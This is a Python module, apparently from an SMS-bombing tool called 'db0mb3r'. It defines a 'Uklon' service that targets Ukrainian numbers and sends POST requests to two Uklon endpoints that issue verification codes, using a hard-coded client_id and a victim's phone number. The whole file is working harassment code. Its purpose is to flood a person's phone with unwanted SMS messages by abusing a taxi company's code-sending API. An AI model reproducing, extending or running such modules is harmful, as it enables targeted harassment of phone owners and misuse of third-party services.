from db0mb3r.services.service import Service


class Uklon(Service):
    phone_codes = [380]

    async def run(self):
        await self.post(
            "https://uklon.com.ua/api/v1/account/code/send",
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": self.formatted_phone},
        )
        await self.post(
            "https://partner.uklon.com.ua/api/v1/registration/sendcode",
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": self.formatted_phone},
        )
